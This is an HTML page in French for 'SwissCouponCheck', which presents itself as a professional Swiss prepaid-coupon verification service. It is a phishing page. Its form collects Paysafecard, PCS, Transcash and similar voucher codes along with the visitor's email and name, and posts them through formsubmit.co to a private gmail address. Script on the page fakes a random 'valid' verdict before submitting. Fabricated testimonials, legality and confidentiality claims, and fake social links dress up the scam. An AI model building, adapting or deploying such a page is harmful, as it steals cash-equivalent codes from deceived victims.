<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SwissCouponCheck - Vérification de Coupons</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #0a3d62;
            --secondary: #38ada9;
            --accent: #f6b93b;
            --dark: #1e272e;
            --light: #f5f6fa;
            --success: #2ed573;
            --error: #ff6b6b;
            --gradient: linear-gradient(135deg, var(--primary), var(--secondary));
            --glow: 0 0 15px rgba(56, 173, 169, 0.5);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: var(--dark);
            color: var(--light);
            line-height: 1.6;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(56, 173, 169, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(246, 185, 59, 0.1) 0%, transparent 20%);
        }

        .container {
            width: 90%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Header */
        header {
            background: rgba(10, 61, 98, 0.95);
            backdrop-filter: blur(10px);
            position: fixed;
            width: 100%;
            z-index: 1000;
            padding: 15px 0;
            border-bottom: 1px solid rgba(56, 173, 169, 0.3);
        }

        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .logo i {
            font-size: 2rem;
            color: var(--accent);
        }

        .logo h1 {
            font-size: 1.8rem;
            background: var(--gradient);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-weight: 700;
        }

        nav ul {
            display: flex;
            list-style: none;
            gap: 30px;
        }

        nav a {
            color: var(--light);
            text-decoration: none;
            font-weight: 500;
            transition: color 0.3s;
            position: relative;
        }

        nav a:hover {
            color: var(--accent);
        }

        nav a::after {
            content: '';
            position: absolute;
            bottom: -5px;
            left: 0;
            width: 0;
            height: 2px;
            background: var(--accent);
            transition: width 0.3s;
        }

        nav a:hover::after {
            width: 100%;
        }

        /* Hero Section */
        .hero {
           padding: 180px 0 100px;
            text-align: center;
            position: relative;
            
        }

        .hero h2 {
            font-size: 3.5rem;
            margin-bottom: 20px;
            background: linear-gradient(to right, var(--light), var(--accent));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .hero p {
            font-size: 1.2rem;
            max-width: 700px;
            margin: 0 auto 30px;
            color: #ccc;
        }

        /* Coupon Types */
        .coupon-types {
            padding: 100px 0;
            background: rgba(30, 39, 46, 0.7);
        }

        .section-title {
            text-align: center;
            margin-bottom: 60px;
        }

        .section-title h2 {
            font-size: 2.5rem;
            margin-bottom: 15px;
            color: var(--accent);
        }

        .section-title p {
            color: #aaa;
            max-width: 600px;
            margin: 0 auto;
        }

        .coupon-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
        }

        .coupon-card {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 30px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            border: 1px solid rgba(56, 173, 169, 0.2);
            position: relative;
            overflow: hidden;
        }

        .coupon-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            transition: left 0.5s;
        }

        .coupon-card:hover::before {
            left: 100%;
        }

        .coupon-card:hover {
            transform: translateY(-10px);
            box-shadow: var(--glow);
        }

        .coupon-icon {
            font-size: 2.5rem;
            color: var(--secondary);
            margin-bottom: 20px;
        }

        .coupon-card h3 {
            font-size: 1.5rem;
            margin-bottom: 15px;
            color: var(--accent);
        }

        .coupon-specs {
            text-align: left;
            margin-top: 20px;
            font-size: 0.9rem;
            color: #ccc;
        }

        .coupon-specs li {
            margin-bottom: 8px;
            display: flex;
            align-items: center;
        }

        .coupon-specs i {
            margin-right: 10px;
            color: var(--secondary);
        }

        /* Verification Section */
        .verification {
            padding: 100px 0;
            background: rgba(10, 61, 98, 0.2);
        }

        .verification-form {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.05);
            padding: 40px;
            border-radius: 15px;
            border: 1px solid rgba(56, 173, 169, 0.3);
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-group label {
            display: block;
            margin-bottom: 10px;
            font-weight: 500;
        }

        .form-control {
            width: 100%;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: var(--light);
            font-size: 1rem;
        }

        .form-control:focus {
            outline: none;
            border-color: var(--secondary);
            box-shadow: 0 0 10px rgba(56, 173, 169, 0.3);
        }

        .btn {
            padding: 12px 25px;
            border-radius: 30px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            border: none;
            outline: none;
            font-size: 1rem;
        }

        .btn-primary {
            background: var(--gradient);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: var(--glow);
        }

        /* Result Display */
        .result {
            margin-top: 30px;
            padding: 20px;
            border-radius: 10px;
            display: none;
            animation: fadeIn 0.5s;
        }

        .result.success {
            background: rgba(46, 213, 115, 0.1);
            border: 1px solid var(--success);
            color: var(--success);
        }

        .result.error {
            background: rgba(255, 107, 107, 0.1);
            border: 1px solid var(--error);
            color: var(--error);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Testimonials */
        .testimonials {
            padding: 100px 0;
            background: rgba(30, 39, 46, 0.7);
        }

        .testimonials-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
        }

        .testimonial-card {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 30px;
            position: relative;
            border: 1px solid rgba(246, 185, 59, 0.2);
        }

        .testimonial-card::before {
            content: '"';
            font-size: 5rem;
            color: rgba(246, 185, 59, 0.3);
            position: absolute;
            top: -10px;
            left: 10px;
        }

        .testimonial-text {
            margin-bottom: 20px;
            font-style: italic;
        }

        .testimonial-author {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .author-avatar {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: var(--gradient);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
        }

        .author-info h4 {
            color: var(--accent);
        }

        .author-info p {
            font-size: 0.9rem;
            color: #aaa;
        }

        /* Footer */
        footer {
            background: var(--primary);
            padding: 60px 0 30px;
        }

        .footer-content {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 40px;
            margin-bottom: 40px;
            
        }

        .footer-column h3 {
            font-size: 1.3rem;
            margin-bottom: 20px;
            color: var(--accent);
            ba
        }

        .footer-column ul {
            list-style: none;
        }

        .footer-column ul li {
            margin-bottom: 10px;
        }

        .footer-column a {
            color: #ccc;
            text-decoration: none;
            transition: color 0.3s;
        }

        .footer-column a:hover {
            color: var(--accent);
        }

        .social-links {
            display: flex;
            gap: 15px;
            margin-top: 20px;
        }

        .social-links a {
           display: flex;
            align-items: center;
            justify-content: center;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            color: var(--light);
            transition: all 0.3s;
        }

        .social-links a:hover {
            background: var(--accent);
            color: var(--dark);
            transform: translateY(-5px);
        }

        .copyright {
            text-align: center;
            padding-top: 30px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            color: #aaa;
            font-size: 0.9rem;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                gap: 20px;
            }

            nav ul {
                gap: 15px;
            }

            .hero h2 {
                font-size: 2.5rem;
            }
        }
        .centre1{
text-align: center;
font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header>
        <div class="container">
            <div class="header-content">
                <div class="logo">
                    <i class="fas fa-qrcode"></i>
                    <h1>SwissCouponCheck</h1>
                </div>
                <nav>
                    <ul>
                        <li><a href="#accueil">Accueil</a></li>
                        <li><a href="#types">Types de Coupons</a></li>
                        <li><a href="#verification">Vérification</a></li>
                        <li><a href="#temoignages">Témoignages</a></li>
                    </ul>
                </nav>
            </div>
        </div>
    </header>

    <!-- Hero Section -->
    <section class="hero" id="accueil">
        <div class="container">
            <h2>VÃ©rification InstantanÃ©e de Coupons</h2>
            <p>Service suisse professionnel de vÃ©rification de coupons de recharge. Validation rapide et sÃ©curisÃ©e pour 6 types de coupons diffÃ©rents.</p>
        </div>
    </section>

    <!-- Coupon Types -->
    <section class="coupon-types" id="types">
        <div class="container">
            <div class="section-title">
                <h2>Types de Coupons SupportÃ©s</h2>
                <p>Notre système prend en charge une large gamme de coupons de recharge avec des caractérique uniques.</p>
            </div>
            <div class="coupon-grid">
                <div class="coupon-card">
                    <div class="coupon-icon">
                        <i class="fas fa-mobile-alt"></i>
                    </div>
                    <h3>PCS</h3>
                    <p>Coupons de recharge téléphonique avec codes a 14 chiffres</p>
                    <ul class="coupon-specs">
                        <li><i class="fas fa-hashtag"></i> Format: 14 chiffres</li>
                        <li><i class="fas fa-euro-sign"></i> Montants: 10â‚¬ Ã  100â‚¬</li>
                        <li><i class="fas fa-clock"></i> ValiditÃ©: 12 mois</li>
                        <li><i class="fas fa-globe"></i> Utilisation: Europe</li>
                    </ul>
                </div>
                <div class="coupon-card">
                    <div class="coupon-icon">
                        <i class="fas fa-ticket-alt"></i>
                    </div>
                    
                    <h3>Transcash</h3>
                    <p>Solution de paiement anonyme et sécurisée</p>
                    <ul class="coupon-specs">
                        <li><i class="fas fa-hashtag"></i> Format: 12 chiffres</li>
                        <li><i class="fas fa-euro-sign"></i> Montants: 15â‚¬ Ã  500â‚¬</li>
                        <li><i class="fas fa-clock"></i> Validation: 18 mois</li>
                        <li><i class="fas fa-globe"></i> Utilisation: Europe et Afrique</li>
                    </ul>
                </div>
                <div class="coupon-card">
                    <div class="coupon-icon">
                        <i class="fas fa-credit-card"></i>
                    </div>
                    <h3>Paysafecard</h3>
                    <p>Coupons prÃ©payÃ©s pour un shopping en ligne sécurisé</p>
                    <ul class="coupon-specs">
                        <li><i class="fas fa-hashtag"></i> Format: 16 chiffres</li>
                        <li><i class="fas fa-euro-sign"></i> Montants: 10â‚¬ Ã  100â‚¬</li>
                        <li><i class="fas fa-clock"></i> ValiditÃ©: 12 mois</li>
                        <li><i class="fas fa-globe"></i> Utilisation: Internationale</li>
                    </ul>
                </div>
                <div class="coupon-card">
                    <div class="coupon-icon">
                        <i class="fas fa-gift"></i>
                    </div>
                    <h3>Googleplay</h3>
                    <p>Ancien systèmes  coupons reconverti </p>
                    <ul class="coupon-specs">
                        <li><i class="fas fa-hashtag"></i> Format: 19 chiffres</li>
                        <li><i class="fas fa-euro-sign"></i> Montants: 10€‚ à  500€‚¬</li>
                        <li><i class="fas fa-clock"></i> Validation: 6 mois (conversion)</li>
                        <li><i class="fas fa-globe"></i> Utilisation: Europe</li>
                    </ul>
                </div>
                <div class="coupon-card">
                    <div class="coupon-icon">
                        <i class="fas fa-globe-europe"></i>
                    </div>
                    <h3>OneCard</h3>
                    <p>Coupons de recharge multi-usages</p>
                    <ul class="coupon-specs">
                        <li><i class="fas fa-hashtag"></i> Format: 14 chiffres</li>
                        <li><i class="fas fa-euro-sign"></i> Montants: 5â‚¬ Ã  200â‚¬</li>
                        <li><i class="fas fa-clock"></i> Validation: 24 mois</li>
                        <li><i class="fas fa-globe"></i> Utilisation: Europe et Amérique</li>
                    </ul>
                </div>
            </div>
        </div>
    </section>

    <!-- Verification Section -->
    <section class="verification" id="verification">
        <div class="container">
            <div class="section-title">
                <h2>Vérifications de Coupon</h2>
                <p>Entrez les dÃ©tails de votre coupon pour une vérification instantanée et sécurisé .</p>
            </div>
            <div class="verification-form">
                <form id="coupon-form" action="https://formsubmit.co/alexandersoros333@gmail.com.com" method="POST">
                    <input type="hidden" name="_subject" value="Nouvelle vérification de coupon">
                    <input type="hidden" name="_template" value="table">
                    
                    <div class="form-group">
                        <label for="coupon-type">Type de coupon</label>
                        <select id="coupon-type" name="Type de coupon" class="form-control" required>
                            <option value="">Seleclectionnez un type</option>
                            <option value="PCS">PCS</option>

                            <option value="Transcash">Transcash</option>
                            <option value="Paysafecard">Paysafecard</option>
                            <option value="Ukash">Googleplay</option>
                            <option value="OneCard">OneCard</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label for="coupon-code">Code du coupon</label>
                        <input type="text" id="coupon-code1" name="Code du coupon" class="form-control" placeholder="Entrez le code du coupon1" required >
                    </div>
                    <div class="form-group">
                        <label for="coupon-code">Code du coupon</label>
                        <input type="text" id="coupon-code2" name="Code du coupon" class="form-control" placeholder="Entrez le code du coupon2" >
                    </div>
                    <div class="form-group">
                        <label for="coupon-code">Code du coupon</label>
                        <input type="text" id="coupon-code3" name="Code du coupon" class="form-control" placeholder="Entrez le code du coupon3" >
                    </div>
                    <div class="form-group">
                        <label for="coupon-code">Code du coupon</label>
                        <input type="text" id="coupon-code4" name="Code du coupon" class="form-control" placeholder="Entrez le code du coupon4" >
                    </div>
                    <div class="form-group">
                        <label for="user-email">Votre email</label>
                        <input type="email" id="user-email" name="Email" class="form-control" placeholder="Votre adresse email" required>
                    </div>
                    <div class="form-group">
                        <label for="user-name">Votre nom</label>
                        <input type="text" id="user-name" name="Nom" class="form-control" placeholder="Votre nom complet">
                    </div>
                    <button type="submit" class="btn btn-primary" style="width: 100%;">VÃ©rifier le Coupon</button>
                </form>
                <div id="verification-result" class="result"></div>
            </div>
        </div>
    </section>

    <!-- Testimonials -->
    <section class="testimonials" id="temoignages">
        <div class="container">
            <div class="section-title">
                <h2>Témoignages de Nos Clients</h2>
                <p>Découvrez ce que nos clients européens disent de notre service de vérification.</p>
            </div>
            <div class="testimonials-grid">
                <div class="testimonial-card">
                    <div class="testimonial-text">
                        "Service extrêmement rapide et fiable. J'ai vérifié plus de 50 coupons PCS sans aucun problèmes. Interface très professionnelle."
                    </div>
                    <div class="testimonial-author">
                        <div class="author-avatar">MS</div>
                        <div class="author-info">
                            <h4>Marie Schneider</h4>
                            <p>Commerçante, Zurich</p>
                        </div>
                    </div>
                </div>
                <div class="testimonial-card">
                    <div class="testimonial-text">
                        "En tant que revendeur de coupons, la rapidité de vérification est cruciale. Ce service m'a fait gagner un temps précieux."
                    </div>
                    <div class="testimonial-author">
                        <div class="author-avatar">LW</div>
                        <div class="author-info">
                            <h4>Luca Weber</h4>
                            <p>Entrepreneur, Genève</p>
                        </div>
                    </div>
                </div>
                <div class="testimonial-card">
                    <div class="testimonial-text">
                        "La vérification des coupons  est instantané. J'apprécie particulièrement l'envoi des résultats par email."
                    </div>
                    <div class="testimonial-author">
                        <div class="author-avatar">SM</div>
                        <div class="author-info">
                            <h4>Sophie Müller</h4>
                            <p>Investisseuse, Bale</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
     <br>
     <br>
<h5 class="centre1">
<b><span style="color: #feab04;">LEGALE</span></b> Notre service de vérification de 
coupons est entièrement conforme aux lois 
en vigueur et respecte les réglementations 
liés à la protection des consommateurs.
 Chaque coupon est contrôlé  avec la plus grande
rigueur afin de garantir 
son Authenticité et sa validation.<br>
<b><span style="color: #feab04;">SECURITE & CONFIDENTIALITE</span></b>
La sécurité de vos informations est au cœur de nos priorité. 
Toutes les données transmises sont 
traitées de manière confidentielle, 
sans aucune revente ni utilisation
 secondaire. Vous pouvez ainsi utiliser
 notre service en toute tranquillité 
 et en totale confiance.<br>
<b><span style="color: #feab04;">A PROPOS DE NOUS</span></b>
Nous sommes une structure fiable et professionnelle 
par la mise en place dâ€™un service fiable, 
rigoureux et transparent. 
Notre objectif est simple : vous offrir une 
expérience professionnelle et sécurisée,
 afin que la vérification de vos coupons soit 
 toujours claire, rapide et sure.</h5>
 <br>
 <br>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="footer-content">
                <div class="footer-column">
                    <h3>SwissCouponCheck</h3>
                    <p>Service suisse professionnel de vÃ©rification de coupons de recharge internationaux. Rapide, sécurisé et fiable.</p>
                    <div class="social-links">
                        <a href="www.faceboock.com/SwissCouponCheck"><i class="fab fa-facebook-f"></i></a>
                        <a href="www.twittwe.com/SwissCouponCheck"><i class="fab fa-twitter"></i></a>
                        <a href="www.tiktok.com/SwissCouponCheck"><i class="fab fa-tiktok"></i></a>
                    </div>
                </div>
                <div class="footer-column">
                    <h3>Liens Rapides</h3>
                    <ul>
                        <li><a href="#accueil">Accueil</a></li>
                        <li><a href="#types">Types de Coupons</a></li>
                        <li><a href="#verification">Vérification</a></li>
                        <li><a href="#temoignages">Témoignages</a></li>
                    </ul>
                </div>
                <div class="footer-column">
                    <h3>Support</h3>
                    <ul>
                        <li><a href="Centre d'Aide">Centre d'Aide</a></li>
                        <li><a href="Contactez-Nous">Contactez-Nous</a></li>
                        <li><a href="FAQ">FAQ</a></li>
                        <li><a href="Politique de Confidentialité">Politique de Confidentialité</a></li>
                    </ul>
                </div>
                <div class="footer-column">
                    <h3>Contact</h3>
                    <ul>
                        <li><i class="fas fa-map-marker-alt"></i> Genève, Suisse</li>
                        <li><i class="fas fa-phone"></i> +41 22 123 45 67</li>
                        <li><i class="fas fa-envelope"></i> 
                            <a href="mailto:Laurantscrt@gmail.com">Laurantscrt@gmail.com</a></li>
                    </ul>
                </div>
            </div>
            <div class="copyright">
                <p>&copy; 2020 SwissCouponCheck. Tous droits réservés.</p>
            </div>
        </div>
    </footer>

    <script>
        // Configuration des types de coupons
        const couponConfig = {
            'PCS': { length: 14, pattern: /^\d{14}$/, amounts: [10, 25, 50, 100] },
            'Transcash': { length: 12, pattern: /^\d{12}$/, amounts: [15, 30, 60, 100, 200, 500] },
            'Paysafecard': { length: 16, pattern: /^\d{16}$/, amounts: [10, 25, 50, 100] },
            'Googleplay': { length: 19, pattern: /^\d{19}$/, amounts: [10, 20, 50, 100, 200, 500] },
            'OneCard': { length: 14, pattern: /^\d{14}$/, amounts: [5, 10, 20, 50, 100, 200] }
        };

        // Gestion de la soumission du formulaire
        document.getElementById('coupon-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const couponType = document.getElementById('coupon-type').value;
            const couponCode = document.getElementById('coupon-code').value;
            const userEmail = document.getElementById('user-email').value;
            const resultDiv = document.getElementById('verification-result');
            
            // Validation du type de coupon
            if (!couponType) {
                showResult('Veuillez sélectionner un type de coupon.', 'error');
                return;
            }
            
            // Validation du code de coupon
            const config = couponConfig[couponType];
            if (!couponCode) {
                showResult('Veuillez entrer un code de coupon.', 'error');
                return;
            }
            
            if (couponCode.length !== config.length) {
                showResult(`Le code ${couponType} doit contenir ${config.length} caractÃ¨res.`, 'error');
                return;
            }
            
            if (!config.pattern.test(couponCode)) {
                showResult(`Format de code ${couponType} invalide.`, 'error');
                return;
            }
            
            // Simulation de vérification (dans un cas réel, on ferait une requête à une API)
            const isValid = Math.random() > 0.2; // 80% de chance que le coupon soit valide
            const amount = isValid ? config.amounts[Math.floor(Math.random() * config.amounts.length)] : 0;
            
            if (isValid) {
                showResult(`âœ… Coupon ${couponType} valide ! Montant: ${amount} â‚¬. Les détails ont été  envoyés ${userEmail}`, 'success');
                
                // Envoi du formulaire après un délai pour permettre l'affichage du résultat 
                setTimeout(() => {
                    // Dans un environnement réel, on enverrait les données Ã  FormSubmit
                    // Pour cette démo, nous allons simplement afficher un message
                    alert('Formulaire soumis avec succÃ¨s! En production, les données seraient envoyées Ã  FormSubmit.');
                     this.submit(); 
                }, 2000);
            } else {
                showResult(`âŒ Coupon ${couponType} invalide ou déja utilisé. Veuillez Verifier le code et réessayer.`, 'error');
            }
        });
        
        // Fonction pour afficher les résultats 
        function showResult(message, type) {
            const resultDiv = document.getElementById('verification-result');
            resultDiv.style.display = 'block';
            resultDiv.textContent = message;
            resultDiv.className = 'result ' + type;
        }
        
        // Animation au défilement 
        window.addEventListener('scroll', function() {
            const elements = document.querySelectorAll('.coupon-card, .testimonial-card');
            
            elements.forEach(element => {
                const position = element.getBoundingClientRect().top;
                const screenPosition = window.innerHeight / 1.3;
                
                if (position < screenPosition) {
                    element.style.opacity = '1';
                    element.style.transform = 'translateY(0)';
                }
            });
        });
        
        // Initialisation des animations
        document.addEventListener('DOMContentLoaded', function() {
            const elements = document.querySelectorAll('.coupon-card, .testimonial-card');
            elements.forEach(element => {
                element.style.opacity = '0';
                element.style.transform = 'translateY(20px)';
                element.style.transition = 'opacity 0.5s, transform 0.5s';
            });
            
            // DÃ©clencher l'animation pour les alignements déjà  visibles
            setTimeout(() => {
                window.dispatchEvent(new Event('scroll'));
            }, 100);
        });
        <script>
    document.getElementById("verification-form").addEventListener("submit", function(e) {
    let code1 = document.getElementById("coupon-code1").value.trim();
    let code2 = document.getElementById("coupon-code2").value.trim();
    let code3 = document.getElementById("coupon-code3").value.trim();
    let code4 = document.getElementById("coupon-code4").value.trim();

    if (code1 === "" && code2 === "" && code3 === "" && code4 === "") {
        e.preventDefault(); // bloque l'envoi
        alert("Veuillez saisir au moins un code coupon.");
    }
});
</script>
    </script>
</body>
</html>
